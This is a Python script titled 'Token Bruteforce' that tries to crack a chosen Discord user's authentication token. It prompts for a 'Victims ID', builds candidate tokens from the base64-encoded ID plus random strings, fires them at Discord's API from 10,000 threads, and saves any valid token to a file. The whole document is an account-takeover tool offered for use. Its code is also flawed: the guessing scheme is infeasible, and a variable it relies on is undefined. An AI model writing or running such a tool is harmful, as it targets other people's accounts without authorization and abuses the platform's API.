import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification

os.system(f'title Token Bruteforce')

TOKEN = input(f"[>] Your token : ")
os.system('cls')

def notifyMe(title, message):
	notification.notify(
		title = title,
		message = message,
		app_icon="./nitro.ico",
		)

class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"[{Fore.RED}>{Fore.RESET}] Victims ID : ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    print(f"{Fore.WHITE}Attempting to crack {Fore.YELLOW}{user}{Fore.WHITE}'s token")
    time.sleep(3)
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
        notifyMe("Token found", f"The token of {user} have just been found ggs")
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.RED}Invalid')


token = os.environ.get(TOKEN)
client = MyClient()
client.run(TOKEN, bot=False,)